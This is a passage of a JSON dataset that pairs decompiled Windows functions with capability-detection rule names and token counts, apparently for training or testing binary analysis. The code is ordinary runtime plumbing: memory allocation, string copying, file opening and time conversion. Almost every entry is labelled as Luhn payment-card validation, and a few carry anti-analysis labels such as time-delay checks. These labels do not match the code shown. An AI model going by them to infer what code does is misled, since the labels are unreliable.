        ],
        "decompiled_code": "\nvoid fcn.0002fb84(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong in_R9;\n    \n    fcn.0002f980(arg1, arg2, arg3, in_R9);\n    return;\n}\n",
        "token_count": 55
    },
    "0002fba4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002fba4(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong in_R9;\n    \n    fcn.0002f980(arg1, arg2, arg3, in_R9);\n    return;\n}\n",
        "token_count": 56
    },
    "0002fbc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002fbc4(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        uVar1 = 0x7a638;\n    }\n    else {\n        uVar1 = fcn.0001c698(1, arg1, 0x7346744e);\n    }\n    return uVar1;\n}\n",
        "token_count": 86
    },
    "0002fbf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002fbf0(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        uVar1 = 0x7a638;\n    }\n    else {\n        uVar1 = fcn.0001c698(0, arg1, 0x7346744e);\n    }\n    return uVar1;\n}\n",
        "token_count": 86
    },
    "0002fc18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0002fc18(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t in_RDX;\n    \n    iVar1 = fcn.0002fbc4(arg1 * in_RDX);\n    if (iVar1 != 0) {\n        fcn.00061a56(iVar1, 0, arg1 * in_RDX);\n    }\n    return iVar1;\n}\n",
        "token_count": 93
    },
    "0002fc74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002fc74(char *arg1)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    char *pcVar4;\n    \n    uVar3 = 0xffffffffffffffff;\n    pcVar4 = arg1;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.0002fbc4(~uVar3);\n    if (iVar2 != 0) {\n        iVar2 = iVar2 - arg1;\n        do {\n            cVar1 = *arg1;\n            arg1[iVar2] = cVar1;\n            arg1 = arg1 + 1;\n        } while (cVar1 != '\\0');\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "0002fcb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0002fcb0(int16_t *arg1)\n\n{\n    int16_t iVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int16_t *piVar4;\n    \n    uVar3 = 0xffffffffffffffff;\n    piVar4 = arg1;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar4;\n        piVar4 = piVar4 + 1;\n    } while (iVar1 != 0);\n    iVar2 = fcn.0002fbc4(~uVar3 * 2);\n    if (iVar2 != 0) {\n        iVar2 = iVar2 - arg1;\n        do {\n            iVar1 = *arg1;\n            *(iVar2 + arg1) = iVar1;\n            arg1 = arg1 + 1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "0002fd3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002fd3c(ulong arg1)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    ulong *puVar7;\n    uint64_t *puVar8;\n    uint64_t uVar9;\n    \n    uVar1 = (**0x113d0)(0x7a630);\n    puVar7 = 0x7a650;\n    uVar9 = 0xffffffff;\n    uVar2 = 0;\n    uVar6 = 0;\n    puVar8 = 0x7a650;\n    do {\n        if (*puVar8 < uVar9) {\n            uVar9 = *puVar8;\n            uVar2 = uVar6;\n        }\n        uVar5 = uVar6 + 1;\n        uVar6 = uVar5;\n        puVar8 = puVar8 + 3;\n    } while (uVar5 < 100);\n    iVar3 = uVar2;\n    uVar4 = fcn.00061b64();\n    *(iVar3 * 0x18 + 0x7a640) = uVar4;\n    *(iVar3 * 0x18 + 0x7a648) = arg1;\n    *(iVar3 * 0x18 + 0x7a650) = *0x7afc8;\n    *0x7afc8 = *0x7afc8 + 1;\n    if (*0x7afc8 == 0) {\n        do {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 3;\n        } while (puVar7 < 0x7afb0);\n    }\n    // WARNING: Could not recover jumptable at 0x0002fddd. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x113c0)(0x7a630, uVar6 & 0xffffffffffffff00 | uVar1);\n    return;\n}\n",
        "token_count": 460
    },
    "0002fde4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002fde4(ulong param_1, uint64_t param_2)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    uVar4 = 0xffffffff;\n    uVar1 = (**0x113d0)(0x7a630);\n    iVar5 = 0;\n    piVar3 = 0x7a640;\n    do {\n        iVar2 = fcn.00061b64();\n        if (*piVar3 == iVar2) {\n            param_2 = iVar5 * 3;\n            uVar4 = *(iVar5 * 0x18 + 0x7a648);\n            break;\n        }\n        piVar3 = piVar3 + 3;\n        iVar5 = iVar5 + 1;\n    } while (piVar3 < 0x7afa0);\n    (**0x113c0)(0x7a630, param_2 & 0xffffffffffffff00 | uVar1);\n    return uVar4;\n}\n",
        "token_count": 243
    },
    "0002fe58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002fe58(void)\n\n{\n    fcn.000619de();\n    return 0;\n}\n",
        "token_count": 26
    },
    "0002fe68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0002fe68(ulong arg1, uint64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uStackX16;\n    uint uStackX20;\n    uchar auStack24 [8];\n    uint64_t uStack16;\n    \n    uStackX20 = 0xffffffff;\n    uStackX16 = 0xfffffffe;\n    iVar1 = fcn.00061a08(arg4, 0, 0, 0, auStack24, arg1, arg3 * arg2, &uStackX16, 0);\n    if (iVar1 == 0) {\n        uStack16 = uStack16 / arg2;\n    }\n    else {\n        uVar2 = fcn.00061a5c();\n        fcn.0002fd3c(uVar2);\n        uStack16 = 0;\n    }\n    return uStack16;\n}\n",
        "token_count": 214
    },
    "0002fee4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0002fee4(ulong arg1, uint64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uStackX16;\n    uint uStackX20;\n    uchar auStack24 [8];\n    uint64_t uStack16;\n    \n    uStackX20 = 0xffffffff;\n    uStackX16 = 0xfffffffe;\n    iVar1 = fcn.00061aaa(arg4, 0, 0, 0, auStack24, arg1, arg3 * arg2, &uStackX16, 0);\n    if (iVar1 == 0) {\n        uStack16 = uStack16 / arg2;\n    }\n    else {\n        uVar2 = fcn.00061a5c();\n        fcn.0002fd3c(uVar2);\n        uStack16 = 0;\n    }\n    return uStack16;\n}\n",
        "token_count": 213
    },
    "0002ffa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002ffa0(ulong arg1)\n\n{\n    fcn.000619de(arg1);\n    return 0;\n}\n",
        "token_count": 31
    },
    "0002ffb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002ffb4(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uStackX32;\n    uint uStackX36;\n    uchar auStack24 [8];\n    uint uStack16;\n    \n    uStackX36 = 0xffffffff;\n    uStackX32 = 0xfffffffe;\n    iVar1 = fcn.00061aaa(arg1, 0, 0, 0, auStack24, arg2, arg3, &uStackX32, 0);\n    if (iVar1 != 0) {\n        if (iVar1 == -0x3fffffef) {\n            uStack16 = 0;\n        }\n        else {\n            uVar2 = fcn.00061a5c();\n            fcn.0002fd3c(uVar2);\n            uStack16 = 0xffffffff;\n        }\n    }\n    return uStack16;\n}\n",
        "token_count": 213
    },
    "00030028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00030028(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uStackX32;\n    uint uStackX36;\n    uchar auStack24 [8];\n    uint uStack16;\n    \n    uStackX36 = 0xffffffff;\n    uStackX32 = 0xfffffffe;\n    iVar1 = fcn.00061a08(arg1, 0, 0, 0, auStack24, arg2, arg3, &uStackX32, 0);\n    if (iVar1 != 0) {\n        uVar2 = fcn.00061a5c();\n        fcn.0002fd3c(uVar2);\n        uStack16 = 0xffffffff;\n    }\n    return uStack16;\n}\n",
        "token_count": 184
    },
    "000300cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.000300cc(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t arg1_00;\n    uint uStackX32;\n    uint uStackX36;\n    uchar auStack24 [16];\n    \n    if (arg3 == 0) {\n        uStackX36 = 0;\n        uStackX32 = arg2;\n        iVar1 = fcn.00061a1a(arg1, auStack24, &uStackX32, 8, 0xe);\n        if (iVar1 == 0) {\n            return arg2;\n        }\n        uVar2 = fcn.00061a5c();\n        arg1_00 = uVar2;\n    }\n    else {\n        arg1_00 = 0x16;\n    }\n    fcn.0002fd3c(arg1_00);\n    return 0xffffffff;\n}\n",
        "token_count": 209
    },
    "00030130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00030130(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *0xfffff78000000014 + -0x19db1ded53e8000 +\n            SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(*0xfffff78000000014 + -0x19db1ded53e8000) >> 0x40, 0);\n    if (arg1 != NULL) {\n        *arg1 = (iVar1 >> 0x17) - (iVar1 >> 0x3f);\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "00030174": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00030174(char *arg1, char **arg2, ulong arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint auStackX16 [6];\n    \n    iVar2 = fcn.00061b6a(arg1, arg3, auStackX16);\n    if (iVar2 != 0) {\n        auStackX16[0] = 0;\n    }\n    if (arg2 != NULL) {\n        for (; (((cVar1 = *arg1,  '/' < cVar1 && (cVar1 < ':')) || (('`' < cVar1 && (cVar1 < 'g')))) ||\n               (('@' < cVar1 && (cVar1 < 'G')))); arg1 = arg1 + 1) {\n        }\n        *arg2 = arg1;\n    }\n    return auStackX16[0];\n}\n",
        "token_count": 197
    },
    "00030244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00030244(ulong arg1)\n\n{\n    if (arg1 - 0x61U < 0x1a) {\n        arg1._0_4_ = arg1 + -0x20;\n    }\n    return arg1;\n}\n",
        "token_count": 60
    },
    "000302c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.000302c4(int16_t *arg1, ulong arg2, char *arg3)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int16_t *piVar4;\n    uint64_t arg2_00;\n    ulong uVar5;\n    ulong var_1h;\n    \n    arg2_00 = arg2;\n    if (*arg3 == '\\\\') {\n        fcn.00031740(arg3, arg1, arg2_00);\n    }\n    else {\n        if ((*arg3 == '\\0') || (arg3[1] != ':')) {\n            fcn.000284e8(arg1, arg2_00);\n            iVar3 = -1;\n            uVar5 = 0x1195c;\n            piVar4 = arg1;\n            do {\n                if (iVar3 == 0) break;\n                iVar3 = iVar3 + -1;\n                iVar1 = *piVar4;\n                piVar4 = piVar4 + 1;\n            } while (iVar1 != 0);\n            iVar2 = ~iVar3 - 1;\n            arg2_00 = arg2 - iVar2;\n            piVar4 = arg1 + iVar2;\n        }\n        else {\n            uVar5 = 0x14140;\n            piVar4 = arg1;\n        }\n        fcn.00061a0e(piVar4, arg2_00, uVar5, arg3);\n        arg1[arg2 - 1] = 0;\n    }\n    return;\n}\n",
        "token_count": 358
    },
    "000303e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.000303e4(ulong arg1, ulong arg2, ulong arg3, char *arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t arg1_00;\n    int64_t iVar4;\n    uint32_t uVar5;\n    ulong uStack152;\n    uchar auStack144 [16];\n    uchar auStack128 [16];\n    uint auStack112 [2];\n    ulong uStack104;\n    uchar *puStack96;\n    uint uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    \n    arg1_00 = fcn.0001c698(1, 0x208, 0x7346744e);\n    if (arg1_00 != 0) {\n        uVar5 = 0;\n        do {\n            fcn.0001fd08(arg4, 0x104, 0x14160, arg1);\n            fcn.000302c4(arg1_00, 0x104, arg4);\n            fcn.000619f0(auStack144, arg1_00);\n            puStack96 = auStack144;\n            auStack112[0] = 0x30;\n            uStack104 = 0;\n            uStack88 = 0x40;\n            uStack80 = 0;\n            uStack72 = 0;\n            iVar2 = fcn.0001dda0(&uStack152, 2, auStack112, auStack128, 0, 0x100, 0, 2, 0, 0, 0);\n            if (iVar2 == 0) {\n                fcn.000619de(uStack152);\n                break;\n            }\n            uVar3 = fcn.00061a5c();\n            fcn.0002fd3c(uVar3);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 100);\n        fcn.0002fc50(arg1_00);\n        iVar4 = -1;\n        do {\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            cVar1 = *arg4;\n            arg4 = arg4 + 1;\n        } while (cVar1 != '\\0');\n        arg1_00 = ~iVar4 - 1;\n    }\n    return arg1_00;\n}\n",
        "token_count": 532
    },
    "0003055c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003055c(int64_t *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    \n    if (arg3 == 0) {\n        fcn.0002fc50(*arg1);\n        *arg1 = 0;\n    }\n    else {\n        iVar1 = fcn.0002fbf0(arg3);\n        if (iVar1 == 0) {\n            return 0xffffffff;\n        }\n        if (arg3 < arg2) {\n            arg2 = arg3;\n        }\n        fcn.000619f6(iVar1, *arg1, arg2);\n        fcn.0002fc50(*arg1);\n        *arg1 = iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 171
    },
    "000305c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000305c4(ulong arg1, char *arg2)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    uint64_t arg1_01;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    ulong auStackX16 [3];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uint auStack88 [2];\n    ulong uStack80;\n    uchar *puStack72;\n    uint uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    \n    uVar3 = 1;\n    if (*arg2 == 'a') {\n        uVar4 = 3;\n        if (arg2[1] == '+') {\n            uVar3 = 7;\n            uVar4 = 3;\ncode_r0x00030639:\n            uVar2 = 0;\n        }\n        else {\n            uVar3 = 4;\n            uVar2 = 1;\n        }\n    }\n    else if (*arg2 == 'r') {\n        uVar4 = 1;\n        if (arg2[1] == '+') {\n            uVar3 = 3;\n            uVar4 = 1;\n            goto code_r0x00030639;\n        }\n        uVar2 = 3;\n    }\n    else {\n        if (*arg2 != 'w') {\n            arg1_01 = 0x16;\n            goto code_r0x000305ee;\n        }\n        uVar2 = 0;\n        uVar4 = 5;\n        if (arg2[1] == '+') {\n            uVar3 = 3;\n            uVar2 = 0;\n        }\n        else {\n            uVar3 = 2;\n        }\n    }\n    arg1_00 = fcn.0001c698(1, 0x208, 0x7346744e);\n    if (arg1_00 == 0) {\n        return 0;\n    }\n    fcn.000302c4(arg1_00, 0x104, arg1);\n    fcn.000619f0(auStack120, arg1_00);\n    puStack72 = auStack120;\n    auStack88[0] = 0x30;\n    uStack80 = 0;\n    uStack64 = 0x40;\n    uStack56 = 0;\n    uStack48 = 0;\n    iVar1 = fcn.0001dda0(auStackX16, uVar3 | 0x100000, auStack88, auStack104, 0, 0x80, uVar2, uVar4, 0x10, 0, 0);\n    fcn.0002fc50(arg1_00);\n    if (iVar1 == 0) {\n        return auStackX16[0];\n    }\n    uVar3 = fcn.00061a5c();\n    arg1_01 = uVar3;\ncode_r0x000305ee:\n    fcn.0002fd3c(arg1_01);\n    return 0;\n}\n",
        "token_count": 682
    },
    "00030744": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00030744(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    uint32_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint auStack136 [2];\n    uchar auStack128 [16];\n    uchar auStack112 [16];\n    uint auStack96 [2];\n    ulong uStack88;\n    uchar *puStack80;\n    uint uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    \n    uVar2 = 0;\n    if ((arg2 & 8) != 0) {\n        uVar2 = 4;\n    }\n    uVar4 = 1;\n    if (((arg2 >> 8 & 1) != 0) && (uVar4 = 3,  (arg2 >> 10 & 1) != 0)) {\n        uVar4 = 2;\n    }\n    uVar3 = 0;\n    if ((arg2 & 3) == 0) {\n        uVar2 = uVar2 | 1;\n        uVar3 = 3;\n    }\n    if ((arg2 & 2) != 0) {\n        uVar2 = uVar2 | 3;\n    }\n    if ((arg2 >> 9 & 1) != 0) {\n        uVar4 = 5;\n    }\n    if ((arg2 & 1) != 0) {\n        uVar2 = uVar2 & 0xfffffffe | 2;\n    }\n    arg1_00 = fcn.0001c698(1, 0x208, 0x7346744e);\n    if (arg1_00 != 0) {\n        fcn.0003034c(arg1_00, 0x104, arg1);\n        fcn.000619f0(auStack128, arg1_00);\n        puStack80 = auStack128;\n        auStack96[0] = 0x30;\n        uStack88 = 0;\n        uStack72 = 0x40;\n        uStack64 = 0;\n        uStack56 = 0;\n        iVar1 = fcn.0001dda0(auStack136, uVar2 | 0x100000, auStack96, auStack112, 0, 0x80, uVar3, uVar4, 0x10, 0, 0);\n        fcn.0002fc50(arg1_00);\n        if (iVar1 == 0) {\n            return auStack136[0];\n        }\n        uVar2 = fcn.00061a5c();\n        fcn.0002fd3c(uVar2);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 615
    },
    "000308b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.000308b8(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint uVar1;\n    int64_t arg1_00;\n    \n    arg1_00 = fcn.0001c698(1, 0x208, 0x7346744e);\n    if (arg1_00 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.000302c4(arg1_00, 0x104, arg1);\n        uVar1 = fcn.00030744(arg1_00, arg2, 0, arg4);\n        fcn.0002fc50(arg1_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 166
    },
    "00030974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00030974(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t arg1_00;\n    uchar auStack88 [16];\n    uint auStack72 [2];\n    ulong uStack64;\n    uchar *puStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    \n    arg1_00 = fcn.0001c698(1, 0x208, 0x7346744e);\n    if (arg1_00 != 0) {\n        fcn.0003034c(arg1_00, 0x104, arg1);\n        fcn.000619f0(auStack88, arg1_00);\n        puStack56 = auStack88;\n        auStack72[0] = 0x30;\n        uStack64 = 0;\n        uStack48 = 0x40;\n        uStack40 = 0;\n        uStack32 = 0;\n        iVar1 = fcn.00061a20(auStack72);\n        fcn.0002fc50(arg1_00);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        uVar2 = fcn.00061a5c();\n        fcn.0002fd3c(uVar2);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 304
    },
    "00030a28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00030a28(ulong arg1)\n\n{\n    uint uVar1;\n    int64_t arg1_00;\n    \n    arg1_00 = fcn.0001c698(1, 0x208, 0x7346744e);\n    if (arg1_00 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        fcn.000302c4(arg1_00, 0x104, arg1);\n        uVar1 = fcn.00030974(arg1_00);\n        fcn.0002fc50(arg1_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 145
    },
    "00030c6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get system information on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00030c6c(int64_t *arg1, uint32_t *arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t aiStackX8 [4];\n    uint16_t uStack72;\n    uint16_t uStack70;\n    uint16_t uStack68;\n    uint16_t uStack66;\n    uint16_t uStack64;\n    uint16_t uStack62;\n    uint16_t uStack60;\n    uchar auStack56 [16];\n    int64_t iStack40;\n    \n    iVar2 = (*arg1 + 0x2b6109100) * 10000000;\n    aiStackX8[0] = iVar2;\n    iVar1 = fcn.00061b52(3, auStack56, 0x20);\n    if (iVar1 == 0) {\n        aiStackX8[0] = iVar2 - iStack40;\n    }\n    fcn.00030a80(aiStackX8, &uStack72);\n    arg2[3] = uStack66;\n    arg2[2] = uStack64;\n    arg2[1] = uStack62;\n    arg2[8] = 0;\n    arg2[7] = 0;\n    arg2[4] = uStack70 - 1;\n    *arg2 = uStack60;\n    arg2[6] = uStack68;\n    arg2[5] = uStack72 - 0x76c;\n    return;\n}\n",
        "token_count": 335
    },
    "00030d1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00030d1c(ulong param_1)\n\n{\n    fcn.00030c6c(param_1, 0x7afa0);\n    return 0x7afa0;\n}\n",
        "token_count": 47
    },
    "00030f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00030f80(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong auStackX16 [3];\n    \n    if (*0x7afd4 == 0) {\n        iVar1 = (*_fcn.00011210)(auStackX16, 0, 0, 0, 0, 0x30f50, 0x7afd4);\n        if (iVar1 == 0) {\n            fcn.00061aa4(auStackX16[0], 0, 0);\n            fcn.000619de(auStackX16[0]);\n            if (*0x7afd4 != 0) goto code_r0x00030ff1;\n        }\n        uVar2 = 0;\n    }\n    else {\ncode_r0x00030ff1:\n        *arg1 = *0x7afd4;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 218
    },
    "00031198": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00031198(int64_t arg1)\n\n{\n    bool bVar1;\n    \n    (*_fcn.00011628)(*(arg1 + 0x10) + 0x40, 0, 0, 0, 0);\n    bVar1 = *(arg1 + 8) == 0;\n    if (bVar1) {\n        *(arg1 + 8) = 0xffffffff;\n    }\n    else {\n        *(arg1 + 4) = *(arg1 + 4) + 1;\n    }\n    (**0x11388)(*(arg1 + 0x10) + 0x40, 0);\n    if (!bVar1) {\n        (*_fcn.00011628)(*(arg1 + 0x10) + 0x20, 0, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "000313cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000313cc(int64_t arg1)\n\n{\n    if (arg1 != 0) {\n        fcn.0002fc50(arg1);\n    }\n    return;\n}\n",
        "token_count": 42
    },
    "00031624": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00031624(ulong *arg1)\n\n{\n    fcn.000619de(*arg1);\n    *arg1 = 0;\n    arg1[1] = 0;\n    return;\n}\n",
        "token_count": 48
    },
    "00031648": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00031648(ulong *arg1, uint *arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    \n    iVar1 = fcn.00061aa4(*arg1, 0, 0);\n    if (iVar1 == 0) {\n        if (arg2 != NULL) {\n            *arg2 = 0xffffffff;\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar2 = fcn.00061a5c();\n        fcn.0002fd3c(uVar2);\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 151
    },
    "00031694": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00031694(ulong *arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong auStackX16 [3];\n    \n    iVar1 = (*_fcn.00011138)(*arg1, 0, **0x11438, 0, auStackX16, 0);\n    if (iVar1 == 0) {\n        (*_fcn.000115b0)(auStackX16[0]);\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 131
    },
    "000316e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000316e0(ulong *arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong auStackX16 [3];\n    \n    iVar1 = (*_fcn.00011138)(*arg1, 0, **0x11438, 0, auStackX16, 0);\n    if (iVar1 == 0) {\n        (**0x11440)(auStackX16[0], 0x1f);\n        (*_fcn.000115b0)(auStackX16[0]);\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.00061a5c(iVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 160
    },
    "00031828": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00031828(ulong arg1, uint *arg2)\n\n{\n    uint uVar1;\n    char *apcStackX16 [3];\n    \n    uVar1 = fcn.00030174(arg1, apcStackX16, 0x10);\n    *arg2 = uVar1;\n    if (*apcStackX16[0] == '.') {\n        uVar1 = fcn.00030174(apcStackX16[0] + 1, apcStackX16, 0x10);\n        arg2[1] = uVar1;\n    }\n    else {\n        arg2[1] = 0;\n    }\n    return 1;\n}\n",
        "token_count": 153
    },
    "00031a34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
